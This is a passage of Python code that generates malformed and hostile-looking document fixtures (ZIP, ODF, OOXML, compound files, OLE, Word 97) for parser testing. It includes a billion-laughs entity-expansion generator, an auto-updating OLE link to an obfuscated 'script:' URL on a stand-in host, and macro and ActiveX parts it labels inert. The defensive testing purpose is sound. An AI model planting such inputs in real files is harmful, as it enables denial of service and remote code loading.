    field holds ones, which says the sizes are not known yet."""
    data = e['data']
    payload = zlib.compress(data, 9)[2:-4] if e['method'] == 8 else data
    crc = zlib.crc32(data) & 0xffffffff
    e.update(flags=0x0808, payload=payload)
    if zip64:
        e.update(lfh={'crc': 0, 'csize': 0xffffffff, 'usize': 0xffffffff}, lfh_extra=struct.pack('<HHQQ', 1, 16, 2 ** 64 - 1, 2 ** 64 - 1),
                 cd={'csize': 0xffffffff, 'usize': 0xffffffff}, cd_extra=struct.pack('<HHQQ', 1, 16, len(data), len(payload)),
                 descriptor=struct.pack('<IIQQ', 0x08074b50, crc, len(payload), len(data)))
    else:
        e.update(lfh={'crc': 0, 'csize': 0, 'usize': 0}, descriptor=struct.pack('<IIII', 0x08074b50, crc, len(payload), len(data)))
    return e


def biff12(rec_type, body):
    """One .xlsb record: the type and the size in seven-bit groups, then the body."""
    head = bytearray()
    for value, most in ((rec_type, 2), (len(body), 4)):
        for _ in range(most):
            head.append((value & 0x7f) | (0x80 if value > 0x7f else 0))
            value >>= 7
            if not head[-1] & 0x80:
                break
    return bytes(head) + body


def wide(text):
    return struct.pack('<I', len(text)) + text.encode('utf-16-le')


def vba(kind, folder):
    """A VBA project as Office stores one: the vbaProject part and its relationship, here an inert marker."""
    return dict(parts=[('%s/vbaProject.bin' % folder, MARKER_OLE)], overrides=[('%s/vbaProject.bin' % folder, 'application/vnd.ms-office.vbaProject')])


ACTIVEX_XML = b'<?xml version="1.0" encoding="UTF-8" standalone="no"?>\n<ax:ocx ax:classid="{D27CDB6E-AE6D-11CF-96B8-444553540000}" ax:persistence="persistStorage" r:id="rId1" xmlns:ax="http://schemas.microsoft.com/office/2006/activeX" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>'
ACTIVEX_PARTS = [('%s/activeX/activeX1.xml', ACTIVEX_XML), ('%s/activeX/_rels/activeX1.xml.rels', rels(rel('rId1', MSR + 'activeXControlBinary', 'activeX1.bin'))), ('%s/activeX/activeX1.bin', MARKER_OLE)]
ACTIVEX_TYPES = [('%s/activeX/activeX1.xml', 'application/vnd.ms-office.activeX+xml'), ('%s/activeX/activeX1.bin', 'application/vnd.ms-office.activeX')]


def activex(folder):
    return [(n % folder, d) for n, d in ACTIVEX_PARTS], [(n % folder, t) for n, t in ACTIVEX_TYPES]


def vml_drawing(shape):
    return ('<xml xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:x="urn:schemas-microsoft-com:office:excel">'
            '<o:shapelayout v:ext="edit"><o:idmap v:ext="edit" data="1"/></o:shapelayout>%s</xml>' % shape).encode()


def case_descriptor_empty_entry():
    items = odf(files=[('Configurations2/accelerator/current.xml', b''), ('styles.xml', b'<?xml version="1.0" encoding="UTF-8"?>\n<office:document-styles xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" office:version="1.3"/>')], media='spreadsheet')
    es = entries_of(items)
    return assemble([es[0]] + [streamed(e) for e in es[1:]])


def case_zip64_streamed():
    es = entries_of(odf(media='spreadsheet'))
    return assemble([es[0]] + [streamed(e, zip64=True) for e in es[1:]])


def case_vml_markers():
    parts, typed = activex('ppt')
    shape = ('<v:shape id="CheckBox1" o:spid="_x0000_s1025" type="#_x0000_t201" style="position:absolute;left:120pt;top:140pt;width:211pt;height:73pt">'
             '<![if gte mso 9]><v:imagedata o:relid="rId3" o:title=""/>\n<![endif]><o:lock v:ext="edit" aspectratio="f"/></v:shape>')
    return zip_bytes(pptx(after='<p:controls><p:control spid="1025" name="CheckBox1" r:id="rId2"/></p:controls>', defaults=[('vml', VML)],
                          parts=parts + [('ppt/drawings/vmlDrawing1.vml', vml_drawing(shape))], overrides=typed,
                          slide_rels=[rel('rId2', RT + 'control', '../activeX/activeX1.xml'), rel('rId4', RT + 'vmlDrawing', '../drawings/vmlDrawing1.vml')]))


def case_vml_br():
    shape = ('<v:shape id="_x0000_s1025" type="#_x0000_t201" o:button="t"><v:textbox><div style="text-align:center"><b>Multi<br>\nLine<br>\nText</b></div></v:textbox>'
             '<x:ClientData ObjectType="Button"><x:FmlaMacro>[0]!Button1_Click</x:FmlaMacro></x:ClientData></v:shape>')
    return zip_bytes(xlsx(sheet='<sheetData/><legacyDrawing r:id="rId1"/>', defaults=[('vml', VML)], parts=[('xl/drawings/vmlDrawing1.vml', vml_drawing(shape))],
                          sheet_rels=[rel('rId1', RT + 'vmlDrawing', '../drawings/vmlDrawing1.vml')]))


def case_vml_nul():
    shape = '<v:shape id="_x0000_s1025" type="#_x0000_t201"><x:ClientData ObjectType="Pict"/></v:shape>\x00'
    return zip_bytes(xlsx(sheet='<sheetData/><legacyDrawing r:id="rId1"/>', defaults=[('vml', VML)], parts=[('xl/drawings/vmlDrawing1.vml', vml_drawing(shape))],
                          sheet_rels=[rel('rId1', RT + 'vmlDrawing', '../drawings/vmlDrawing1.vml')]))


def case_ascii_declaration(text):
    """Shared strings that declare us-ascii, as SharePoint declares the custom XML it writes."""
    sst = ('<?xml version="1.0" encoding="us-ascii"?><sst xmlns="%s" count="1" uniqueCount="1"><si><t>%s</t></si></sst>' % (S, text)).encode('utf-8')
    return zip_bytes(xlsx(parts=[('xl/sharedStrings.xml', sst)], overrides=[('xl/sharedStrings.xml', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sharedStrings+xml')],
                          workbook_rels=[rel('rId2', RT + 'sharedStrings', 'sharedStrings.xml')]))


def case_xlsb(link=None, macros=False):
    workbook = biff12(131, b'') + biff12(132, b'')
    parts = [('xl/workbook.bin', workbook)]
    overrides, wb_rels = [], []
    if link:
        parts.append(('xl/externalLinks/externalLink1.bin', biff12(360, struct.pack('<H', 1) + wide(link[0]) + wide(link[1])) + biff12(361, b'')))
        overrides.append(('xl/externalLinks/externalLink1.bin', 'application/vnd.ms-excel.externalLink'))
        wb_rels.append(rel('rId2', RT + 'externalLink', 'externalLinks/externalLink1.bin'))
    if macros:
        v = vba('xlsb', 'xl')
        parts += v['parts']
        overrides += v['overrides']
        wb_rels.append(rel('rId3', MSR + 'vbaProject', 'vbaProject.bin'))
    items = [('[Content_Types].xml', types(overrides, [('bin', MAIN['xlsb'])])), ('_rels/.rels', rels(rel('rId1', RT + 'officeDocument', 'xl/workbook.bin')))]
    items += parts
    if wb_rels:
        items.append(('xl/_rels/workbook.bin.rels', rels(*wb_rels)))
    return zip_bytes(items)


def case_encoded_scheme():
    tree = '<p:graphicFrame><a:graphic><a:graphicData uri="http://schemas.openxmlformats.org/presentationml/2006/ole"><p:oleObj progId="Package" r:id="rId2"><p:link updateAutomatic="1"/></p:oleObj></a:graphicData></a:graphic></p:graphicFrame>'
    return zip_bytes(pptx(tree, slide_rels=[rel('rId2', RT + 'oleObject', '%73cript:%68ttp://example.invalid/marker', True)]))


def case_configurations2(menubar):
    files = [('Configurations2/accelerator/current.xml', b'')]
    if menubar:
        files.append(('Configurations2/menubar/menubar.xml', b'<?xml version="1.0" encoding="UTF-8"?>\n<menu:menubar xmlns:menu="http://openoffice.org/2001/menu"><menu:menu menu:id=".uno:FileMenu"/></menu:menubar>'))
    return zip_bytes(odf(files=files))


def broken_docx(**changes):
    return assemble(docx_entries(**changes))


def case_two_archives():
    first = assemble(docx_entries())
    second = assemble([entry('[Content_Types].xml', MINIMAL_DOCX[0][1]), entry('_rels/.rels', MINIMAL_DOCX[1][1]), entry('word/document.xml', word_document('<w:p>%s</w:p>' % run('Second')))])
    return first + second


def case_end_in_comment():
    # The first archive's end record has a comment that runs to the end of the file and holds a second central
    # directory and end record, which list one more entry.
    es = docx_entries()
    extra = entry('word/note.xml', b'<note/>', method=0)
    whole = assemble(es + [extra])
    end_at = whole.rindex(struct.pack('<I', 0x06054b50))
    cd_offset = struct.unpack('<I', whole[end_at + 16:end_at + 20])[0]
    cd_all = whole[cd_offset:end_at]
    cd_first = cd_all[:cd_all.rindex(struct.pack('<I', 0x02014b50))]
    tail = cd_all + struct.pack('<IHHHHIIH', 0x06054b50, 0, 0, 4, 4, len(cd_all), cd_offset + len(cd_first) + 22, 0)
    first_end = struct.pack('<IHHHHIIH', 0x06054b50, 0, 0, 3, 3, len(cd_first), cd_offset, len(tail))
    return whole[:cd_offset] + cd_first + first_end + tail


def case_zip64_end_disagrees():
    base = assemble(docx_entries())
    end_at = base.rindex(struct.pack('<I', 0x06054b50))
    count, cd_size, cd_offset = 3, struct.unpack('<I', base[end_at + 12:end_at + 16])[0], struct.unpack('<I', base[end_at + 16:end_at + 20])[0]
    end64 = struct.pack('<IQHHIIQQQQ', 0x06064b50, 44, 45, 45, 0, 0, count, count, cd_size + 1, cd_offset - 1)
    locator = struct.pack('<IIQI', 0x07064b50, 0, end_at, 1)
    return base[:end_at] + end64 + locator + base[end_at:]


def case_encrypted_entries():
    header = b'\x00' * 11 + b'\x07'
    return assemble([entry('sample.bin', header + b'inert marker', method=0, flags=1, payload=header + b'inert marker')])


def case_deep_nesting():
    return zip_bytes(docx('<w:tbl>' + '<w:tr><w:tc><w:tbl>' * 90 + '</w:tbl></w:tc></w:tr>' * 90 + '</w:tbl>'))


def case_doc_with(part, data, base=None):
    items = base or docx('<w:p/>')
    return zip_bytes([(n, data if n == part else d) for n, d in items])


def case_hyperlinks():
    body = '<w:p><w:hyperlink r:id="rId2"><w:r><w:t>Criteria</w:t></w:r></w:hyperlink><w:hyperlink r:id="rId3"><w:r><w:t>List</w:t></w:r></w:hyperlink></w:p>'
    return zip_bytes(docx(body, part_rels={'word/document.xml': [rel('rId2', RT + 'hyperlink', 'https://example.com/files/criteria.doc', True), rel('rId3', RT + 'hyperlink', 'https://example.com/files/list.xls', True)]}))


def case_trash():
    items = docx('<w:p/>', kind='dotx')
    return zip_bytes(items + [('[trash]/0000.dat', b'inert'), ('[trash]/0001.dat', b'inert')])


def case_mimetype_not_first():
    items = odf()
    return zip_bytes(items[1:2] + items[:1] + items[2:])


def case_odf_events(media, body, files=()):
    return zip_bytes(odf(body=body, media=media, files=files))


def case_empty_href():
    """Empty hrefs, which name the document itself and nothing outside it: a form button, a text link, an image with no
    picture, and a template named only by its title."""
    meta = ('<?xml version="1.0" encoding="UTF-8"?>\n<office:document-meta %s xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0" '
            'xmlns:xlink="http://www.w3.org/1999/xlink" office:version="1.3"><office:meta><meta:template xlink:type="simple" '
            'xlink:actuate="onRequest" xlink:title="Normal" xlink:href=""/></office:meta></office:document-meta>' % ODF_OFFICE)
    body = ('<office:text><office:forms xmlns:form="urn:oasis:names:tc:opendocument:xmlns:form:1.0"><form:form form:name="f">'
            '<form:button form:name="b" form:id="b1" form:button-type="push" xlink:type="simple" xlink:href=""/></form:form>'
            '</office:forms><text:p><text:a xlink:type="simple" xlink:href="">this document</text:a></text:p>'
            '<text:p><draw:frame svg:width="8cm" svg:height="2cm"><draw:image xlink:href=""><text:p/></draw:image></draw:frame></text:p></office:text>')
    return case_odf_events('text', body, files=[('meta.xml', meta.encode())])


def case_empty_events():
    """Document events bound to an empty script URL. LibreOffice runs nothing for an event whose script URL is empty."""
    names = ('office:load-finished', 'office:view-created', 'office:save', 'office:print', 'dom:unload')
    listeners = ''.join('<script:event-listener script:language="ooo:script" script:event-name="%s" xlink:href=""/>' % n for n in names)
    content = ('<?xml version="1.0" encoding="UTF-8"?>\n<office:document-content %s office:version="1.3"><office:scripts><office:event-listeners>%s'
               '</office:event-listeners></office:scripts><office:body><office:text><text:p>Text</text:p></office:text></office:body>'
               '</office:document-content>' % (NS_ODF, listeners)).encode()
    return zip_bytes([(n, content if n == 'content.xml' else d) for n, d in odf()])


MANIFEST_DOCTYPE = '<!DOCTYPE manifest:manifest PUBLIC "-//OpenOffice.org//DTD Manifest 1.0//EN" "Manifest.dtd">'
ODF_OFFICE = 'xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"'


def old_manifest(media_type, files, xmlns):
    """A manifest as OpenOffice.org 1.x and 2.x wrote one: the document type declaration with a name and a public
    identifier and no internal subset, no manifest:version, and the media type before the path. `xmlns` declares the
    manifest prefix, or is '' when only the external DTD declared it."""
    entries = ''.join(' <manifest:file-entry manifest:media-type="%s" manifest:full-path="%s"/>\n' % (t, n) for n, t in files)
    return ('<?xml version="1.0" encoding="UTF-8"?>\n%s\n<manifest:manifest%s>\n <manifest:file-entry manifest:media-type="%s" manifest:full-path="/"/>\n%s</manifest:manifest>' % (
        MANIFEST_DOCTYPE, xmlns, media_type, entries)).encode()


def case_ooo2_text():
    """An OpenOffice.org 2.x-style text document: the stored mimetype first, empty Configurations2/ and Pictures/
    folders, a stored meta.xml, office:version 1.0, and the manifest last."""
    head = '<?xml version="1.0" encoding="UTF-8"?>\n'
    text_ns = '%s xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0"' % ODF_OFFICE
    files = [
        ('Configurations2/', b''),
        ('Pictures/', b''),
        ('content.xml', (head + '\n<office:document-content %s office:version="1.0"><office:body><office:text><text:p>Text</text:p></office:text></office:body></office:document-content>' % text_ns).encode()),
        ('styles.xml', (head + '\n<office:document-styles %s office:version="1.0"/>' % text_ns).encode()),
        ('meta.xml', (head + '<office:document-meta %s xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0" office:version="1.0"><office:meta><meta:generator>OpenOffice.org/2.4</meta:generator></office:meta></office:document-meta>' % ODF_OFFICE).encode()),
        ('settings.xml', (head + '\n<office:document-settings %s office:version="1.0"/>' % ODF_OFFICE).encode()),
    ]
    types = {'Configurations2/': 'application/vnd.sun.xml.ui.configuration', 'Pictures/': ''}
    manifest = old_manifest('application/vnd.oasis.opendocument.text', [(n, types.get(n, 'text/xml')) for n, _ in files],
                            ' xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0"')
    es = [entry('mimetype', b'application/vnd.oasis.opendocument.text', method=0)]
    es += [entry(n, d, method=0 if n.endswith('/') or n == 'meta.xml' else 8) for n, d in files]
    return assemble(es + [entry('META-INF/manifest.xml', manifest)])


def case_sun_xml(media_type, xmlns, content_ns):
    """A package with a StarOffice media type and a manifest in the form OpenOffice.org 1.x and 2.x wrote."""
    content = ('<?xml version="1.0" encoding="UTF-8"?>\n<office:document-content xmlns:office="%s" office:version="1.0"><office:body/></office:document-content>' % content_ns).encode()
    return zip_bytes([('mimetype', media_type.encode()), ('content.xml', content), ('META-INF/manifest.xml', old_manifest(media_type, [('content.xml', 'text/xml')], xmlns))])


def billion_laughs(root):
    """The billion laughs: nine levels of ten references each, under a document type named `root`."""
    levels = ''.join('<!ENTITY lol%d "%s">' % (i, ('&lol%s;' % (i - 1 or '')) * 10) for i in range(1, 10))
    return '<!DOCTYPE %s [<!ENTITY lol "lol">%s]>' % (root, levels)


ODF_BASIC_FILES = [('Basic/script-lc.xml', b'<?xml version="1.0" encoding="UTF-8"?>\n<library:libraries xmlns:library="http://openoffice.org/2000/library"/>'),
                   ('Basic/Standard/Module1.xml', b'<?xml version="1.0" encoding="UTF-8"?>\n<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic">REM inert marker</script:module>')]
ODF_ON_LOAD = ('<office:scripts><office:event-listeners><script:event-listener script:language="ooo:script" script:event-name="dom:load" '
               'xlink:href="vnd.sun.star.script:Standard.Module1.Marker?language=Basic&amp;location=document"/></office:event-listeners></office:scripts>')

# ---------- compound files, written byte by byte ----------
#
# A compound file (MS-CFB) is a header, a FAT of sector chains, a directory of red-black trees, and a mini stream for
# streams under 4,096 bytes. cfb() lays one out from a tree of Stream and Storage values. `mutate` gets the model before
# it becomes bytes, so a fixture can break one rule of the format: a chain that loops, two streams sharing a sector, a
# directory entry reached twice, a sector past the end of the file.

ENDOFCHAIN, FREESECT, FATSECT, NOSTREAM = 0xFFFFFFFE, 0xFFFFFFFF, 0xFFFFFFFD, 0xFFFFFFFF
CFB_SIG = bytes.fromhex('d0cf11e0a1b11ae1')


class Stream:
    def __init__(self, name, data):
        self.name, self.data = name, data


class Storage:
    def __init__(self, name, children, clsid=None):
        self.name, self.children, self.clsid = name, children, clsid


def clsid_bytes(text):
    """A GUID as Windows writes it, '0002CE02-0000-0000-C000-000000000046', in the byte order a file holds."""
    if text is None:
        return bytes(16)
    h = text.replace('-', '')
    b = bytes.fromhex(h)
    return b[3::-1] + b[5:3:-1] + b[7:5:-1] + b[8:]


def cfb(root_children, root_clsid=None, mutate=None, trailing=b'', version=3, fat_sectors=1):
    """A compound file holding `root_children`: version 3 with 512-byte sectors, or 4 with 4,096-byte ones. Siblings form a
    balanced tree, sorted as MS-CFB sorts them. `fat_sectors` asks for at least that many FAT sectors, past 109 of which a
    DIFAT chain lists the rest."""
    ss = 512 if version == 3 else 4096
    per = ss // 4
    entries = []  # [kind, name, data or None, clsid, left, right, child]

    def add(node):
        i = len(entries)
        if isinstance(node, Stream):
            entries.append(['stream', node.name, node.data, None, NOSTREAM, NOSTREAM, NOSTREAM])
        else:
            entries.append(['storage', node.name, None, node.clsid, NOSTREAM, NOSTREAM, NOSTREAM])
        return i

    def tree(ids):
        if not ids:
            return NOSTREAM
        mid = len(ids) // 2
        entries[ids[mid]][4] = tree(ids[:mid])
        entries[ids[mid]][5] = tree(ids[mid + 1:])
        return ids[mid]

    def build(index, children):
        ids = [add(c) for c in children]
        for c, i in zip(children, ids):
            if isinstance(c, Storage):
                build(i, c.children)
        ids.sort(key=lambda i: (len(entries[i][1]), entries[i][1].upper()))
        entries[index][6] = tree(ids)

    entries.append(['root', 'Root Entry', None, root_clsid, NOSTREAM, NOSTREAM, NOSTREAM])
    build(0, root_children)

    # The mini stream holds every stream under 4,096 bytes, in 64-byte mini sectors.
    mini, minifat, starts = bytearray(), [], {}
    for i, e in enumerate(entries):
        if e[0] == 'stream' and 0 < len(e[2]) < 4096:
            n = (len(e[2]) + 63) // 64
            first = len(mini) // 64
            starts[i] = first
            minifat += [first + k + 1 for k in range(n - 1)] + [ENDOFCHAIN]
            mini += e[2] + bytes(n * 64 - len(e[2]))
    big = [i for i, e in enumerate(entries) if e[0] == 'stream' and len(e[2]) >= 4096]
    dir_n = (len(entries) * 128 + ss - 1) // ss
    minifat_n = (len(minifat) * 4 + ss - 1) // ss
    mini_n = (len(mini) + ss - 1) // ss
    data_n = sum((len(entries[i][2]) + ss - 1) // ss for i in big)
    fat_n = fat_sectors
    difat_n = 0
    while True:
        difat_n = (fat_n - 109 + per - 2) // (per - 1) if fat_n > 109 else 0
        if fat_n * per >= fat_n + difat_n + dir_n + minifat_n + mini_n + data_n:
            break
        fat_n += 1
    layout = {'fat': list(range(fat_n)), 'difat': list(range(fat_n, fat_n + difat_n))}
    pos = fat_n + difat_n

    def take(n):
        nonlocal pos
        out = list(range(pos, pos + n))
        pos += n
        return out
    layout['dir'] = take(dir_n)
    layout['minifat'] = take(minifat_n)
    layout['mini'] = take(mini_n)
    layout['streams'] = {i: take((len(entries[i][2]) + ss - 1) // ss) for i in big}
    fat = [FREESECT] * (fat_n * per)
    for s in layout['fat']:
        fat[s] = FATSECT
    for s in layout['difat']:
        fat[s] = 0xFFFFFFFC

    def chain(sectors):
        for a, b in zip(sectors, sectors[1:]):
            fat[a] = b
        if sectors:
            fat[sectors[-1]] = ENDOFCHAIN
    for key in ('dir', 'minifat', 'mini'):
        chain(layout[key])
    for sectors in layout['streams'].values():
        chain(sectors)
    sector_data = {}

    def put(sectors, data):
        for k, s in enumerate(sectors):
            sector_data[s] = bytes(data[k * ss:(k + 1) * ss]).ljust(ss, b'\0')
    put(layout['mini'], bytes(mini))
    for i, sectors in layout['streams'].items():
        put(sectors, entries[i][2])

    directory = []
    for i, e in enumerate(entries):
        name = e[1].encode('utf-16-le')
        kind = {'root': 5, 'storage': 1, 'stream': 2}[e[0]]
        if e[0] == 'root':
            start, size = (layout['mini'][0] if mini else ENDOFCHAIN), len(mini)
        elif e[0] == 'storage':
            start, size = 0, 0
        elif len(e[2]) >= 4096:
            start, size = layout['streams'][i][0], len(e[2])
        else:
            start, size = (starts[i] if e[2] else ENDOFCHAIN), len(e[2])
        d = bytearray(128)
        d[0:len(name)] = name
        struct.pack_into('<HBBIII', d, 64, len(name) + 2, kind, 1, e[4], e[5], e[6])
        d[80:96] = clsid_bytes(e[3])
        struct.pack_into('<IQ', d, 116, start, size)
        directory.append(d)
    while len(directory) % (ss // 128):
        d = bytearray(128)
        struct.pack_into('<III', d, 68, NOSTREAM, NOSTREAM, NOSTREAM)
        directory.append(d)
    dir_n = len(directory) * 128 // ss

    header = bytearray(ss)
    header[0:8] = CFB_SIG
    struct.pack_into('<HHHHH', header, 24, 0x3E, version, 0xFFFE, 9 if version == 3 else 12, 6)
    struct.pack_into('<IIIIIIIII', header, 40, 0 if version == 3 else dir_n, fat_n, layout['dir'][0], 0, 4096,
                     layout['minifat'][0] if minifat_n else ENDOFCHAIN, minifat_n, layout['difat'][0] if difat_n else ENDOFCHAIN, difat_n)
    for k in range(109):
        struct.pack_into('<I', header, 76 + 4 * k, layout['fat'][k] if k < fat_n else FREESECT)
    rest = layout['fat'][109:]
    for k, s in enumerate(layout['difat']):
        listed = rest[k * (per - 1):(k + 1) * (per - 1)]
        nxt = layout['difat'][k + 1] if k + 1 < difat_n else ENDOFCHAIN
        sector_data[s] = b''.join(struct.pack('<I', v) for v in listed + [FREESECT] * (per - 1 - len(listed)) + [nxt])
    model = {'header': header, 'fat': fat, 'minifat': minifat, 'dir': directory, 'layout': layout, 'sectors': sector_data, 'count': pos, 'trailing': trailing, 'ss': ss}
    if mutate:
        mutate(model)
    put(model['layout']['minifat'], b''.join(struct.pack('<I', v) for v in model['minifat']))
    out = bytearray(model['header'])
    n = ss // 128
    for s in range(model['count']):
        if s in model['layout']['fat']:
            k = model['layout']['fat'].index(s)
            out += b''.join(struct.pack('<I', v) for v in model['fat'][k * per:(k + 1) * per])
        elif s in model['layout']['dir']:
            k = model['layout']['dir'].index(s)
            out += b''.join(bytes(d) for d in model['dir'][k * n:(k + 1) * n])
        else:
            out += model['sectors'].get(s, bytes(ss))
    return bytes(out) + model['trailing']


def entry_index(model, name):
    """The directory position of the entry with this name."""
    for k, d in enumerate(model['dir']):
        n = struct.unpack_from('<H', d, 64)[0]
        if bytes(d[:max(0, n - 2)]).decode('utf-16-le') == name:
            return k
    sys.exit('no directory entry %r' % name)


def set_entry(model, name, **fields):
    """Changes fields of a directory entry: type, left, right, child, start, size, name_length, name_bytes."""
    d = model['dir'][entry_index(model, name)]
    offsets = {'type': ('<B', 66), 'left': ('<I', 68), 'right': ('<I', 72), 'child': ('<I', 76), 'start': ('<I', 116), 'size': ('<Q', 120), 'name_length': ('<H', 64)}
    for k, v in fields.items():
        if k == 'name_bytes':
            d[0:64] = v.ljust(64, b'\0')
        else:
            struct.pack_into(offsets[k][0], d, offsets[k][1], v)


def set_header(model, **fields):
    """Changes header fields: major, shift, mini_shift, byte_order, fat_count, first_dir, cutoff, minifat_count, difat_first, difat_count, difat0, difat1."""
    offsets = {'major': ('<H', 26), 'byte_order': ('<H', 28), 'shift': ('<H', 30), 'mini_shift': ('<H', 32), 'fat_count': ('<I', 44), 'first_dir': ('<I', 48),
               'cutoff': ('<I', 56), 'minifat_count': ('<I', 64), 'difat_first': ('<I', 68), 'difat_count': ('<I', 72), 'difat0': ('<I', 76), 'difat1': ('<I', 80)}
    for k, v in fields.items():
        struct.pack_into(offsets[k][0], model['header'], offsets[k][1], v)


# ---------- OLE objects, as Office stores them in a storage or as OLE 1.0 data ----------

EQUATION_CLSID = '0002CE02-0000-0000-C000-000000000046'
URL_MONIKER = '79EAC9E0-BAF9-11CE-8C82-00AA004BA90B'
FILE_MONIKER = '00000303-0000-0000-C000-000000000046'


def lp_ansi(s):
    """A LengthPrefixedAnsiString: a 32-bit count that includes the NUL, then the text and the NUL."""
    b = s.encode('latin-1') + b'\0'
    return struct.pack('<I', len(b)) + b


def comp_obj(user_type, prog_id):
    """A CompObj stream (MS-OLEDS 2.3.8): the user type, no clipboard format, and the ProgID."""
    return struct.pack('<II', 0xFFFE0001, 0x00000A03) + bytes(20) + lp_ansi(user_type) + struct.pack('<I', 0) + lp_ansi(prog_id) + struct.pack('<I', 0x71B239F4) + bytes(12)


def url_moniker(url):
    s = url.encode('utf-16-le') + b'\0\0'
    return clsid_bytes(URL_MONIKER) + struct.pack('<I', len(s)) + s


def file_moniker(path):
    ansi = path.encode('latin-1') + b'\0'
    return clsid_bytes(FILE_MONIKER) + struct.pack('<HI', 0, len(ansi)) + ansi + struct.pack('<HH', 0xFFFF, 0xDEAD) + bytes(16) + struct.pack('<I', 0)


def ole_stream(link=None):
    """An OLE stream (MS-OLEDS 2.3.3). With `link`, a moniker, the object is linked and the moniker is its absolute source."""
    if link is None:
        return struct.pack('<IIIII', 0x02000001, 0, 0, 0, 0)
    return struct.pack('<IIIII', 0x02000001, 1, 1, 0, 0) + struct.pack('<I', 0) + struct.pack('<I', len(link)) + link + struct.pack('<i', -1) + bytes(16) + struct.pack('<I', 0) + bytes(28)


def package_native(file_name, source, temp, data):
    """Packager's native data, as the Package class writes it: a type, the label, the source, then the temporary path and the file."""
    return (struct.pack('<H', 2) + file_name.encode('latin-1') + b'\0' + source.encode('latin-1') + b'\0' + struct.pack('<HH', 0, 3)
            + struct.pack('<I', len(temp) + 1) + temp.encode('latin-1') + b'\0' + struct.pack('<I', len(data)) + data)


def ole_object(children, clsid=None, user_type='', prog_id='', link=None):
    """The streams of an OLE object's storage: CompObj, the OLE stream and ObjInfo, before `children`."""
    return [Stream('\x01CompObj', comp_obj(user_type, prog_id)), Stream('\x01Ole', ole_stream(link)), Stream('\x03ObjInfo', b'\x00\x00\x03\x00\x01\x00')] + children


def ole1(class_name, native=b'', linked_topic=None):
    """An OLE 1.0 object (MS-OLEDS 2.2), as RTF's objdata holds one: embedded with native data, or linked to a topic."""
    if linked_topic is not None:
        return struct.pack('<II', 0x00000501, 1) + lp_ansi(class_name) + lp_ansi(linked_topic) + lp_ansi('') + lp_ansi('') + struct.pack('<II', 0, 1)
    return struct.pack('<II', 0x00000501, 2) + lp_ansi(class_name) + lp_ansi('') + lp_ansi('') + struct.pack('<I', len(native)) + native


VBA_PROJECT = [Stream('PROJECT', b'ID="{00000000-0000-0000-0000-000000000000}"\r\nName="Project"\r\n'), Stream('PROJECTwm', b'\0\0'),
               Storage('VBA', [Stream('dir', b'\x01inert marker, not a compressed dir stream'), Stream('_VBA_PROJECT', b'\xcc\x61\xff\xff\x00\x00\x00'),
                               Stream('ThisDocument', b'inert marker')])]

# ---------- Word 97 and Word 6.0 documents ----------


def fib97(ccp_text, pairs, flags=0):
    """A Word 97 FIB (MS-DOC 2.5.1): FibBase, 14 16-bit values, 22 32-bit values with ccpText, and 93 fc/lcb pairs."""
    base = struct.pack('<HHHHHHHIBBHHII', 0xA5EC, 0xC1, 0, 0x0409, 0, flags | 0x1000, 0xBF, 0, 0, 0, 0, 0, 0, 0)
    lw = [0] * 22
    lw[3] = ccp_text
    fc = [(0, 0)] * 93
    for k, v in pairs.items():
        fc[k] = v
    return base + struct.pack('<H', 14) + bytes(28) + struct.pack('<H', 22) + struct.pack('<22I', *lw) + struct.pack('<H', 93) + b''.join(struct.pack('<II', a, b) for a, b in fc) + struct.pack('<H', 0)


def sttb_unicode(strings):
    return struct.pack('<HHH', 0xFFFF, len(strings), 0) + b''.join(struct.pack('<H', len(s)) + s.encode('utf-16-le') for s in strings)


def word_doc(text, template=None, dot=False, encrypted=False, compressed=False, extra=(), clx=None, assoc=None, table='1Table', streams=False, table_prefix=b'', flags_extra=0, **cfb_options):
    """A Word 97 document whose text is `text`, one piece, stored as UTF-16 or 8-bit. `template` goes in SttbfAssoc.
    `table_prefix` stands at the start of the table stream, the FIB's offsets past it, and `streams` returns the
    WordDocument stream, the table stream and the Data stream instead of a compound file."""
    text_at = 1024
    stored = text.encode('latin-1') if compressed else text.encode('utf-16-le')
    clx = clx if clx is not None else b'\x02' + struct.pack('<I', 4 * 2 + 8) + struct.pack('<II', 0, len(text)) + struct.pack('<HIH', 0, (text_at * 2) | 0x40000000 if compressed else text_at, 0)
    data = bytearray(table_prefix + clx)
    pairs = {33: (len(table_prefix), len(clx))}
    if template is not None or assoc is not None:
        assoc = assoc if assoc is not None else sttb_unicode(['', template])
        pairs[32] = (len(data), len(assoc))
        data += assoc
    flags = (1 if dot else 0) | (0x0100 if encrypted else 0) | (0x0200 if table == '1Table' else 0) | flags_extra
    fib = fib97(len(text), pairs, flags)
    word = fib.ljust(text_at, b'\0') + stored
    if streams:
        return word.ljust(4096, b'\0'), bytes(data), b''
    return cfb([Stream('WordDocument', word.ljust(4096, b'\0')), Stream(table, bytes(data)), Stream('\x01CompObj', comp_obj('Microsoft Word 97-2004 Document', 'Word.Document.8'))] + list(extra),
               root_clsid='00020906-0000-0000-C000-000000000046', **cfb_options)


def word6_doc(text, macros=0, dot=False, encrypted=False, pieces=None):
    """A Word 6.0 document: its 8-bit text from fcMin to fcMac. `macros` sets the length of the macro table, at FIB offset 0x11C.
    `pieces` makes it a file saved fast: the pieces, in reading order, are stored last first, and a piece table at
    fcClx (FIB offset 0x160) puts them back in order."""
    fib = bytearray(0x300)
    struct.pack_into('<HHHHHH', fib, 0, 0xA5DC, 0x65, 0, 0x0409, 0, (1 if dot else 0) | (0x0100 if encrypted else 0) | (0x0004 if pieces else 0))
    if pieces:
        stored, at, fcs = b'', 0x300, {}
        for i in reversed(range(len(pieces))):
            fcs[i] = at + len(stored)
            stored += pieces[i].encode('latin-1')
        text_bytes = stored
        cps = [0]
        for piece in pieces:
            cps.append(cps[-1] + len(piece))
        plc = b''.join(struct.pack('<I', c) for c in cps) + b''.join(struct.pack('<HIH', 0, fcs[i], 0) for i in range(len(pieces)))
